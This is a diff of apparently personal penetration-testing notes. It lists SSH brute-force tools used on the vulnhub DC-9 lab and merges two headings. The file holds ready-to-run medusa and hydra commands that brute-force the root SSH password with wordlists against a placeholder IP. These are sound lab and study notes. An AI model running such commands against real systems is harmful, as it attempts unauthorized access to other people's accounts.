@@ -7,10 +7,8 @@
 |ssh|medusa|ippsec example vulnhub DC-9 - works great|
 |ssh|ncrack|ippsec example vulnhub DC-9, in kali apt|
 
-# command shortlist
 
-# SSH
-from hacktricks
+# SSH brute force command shortlist from hacktricks
 ```bash
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
 hydra -l root -P passwords.txt [-t 32] <IP> ssh
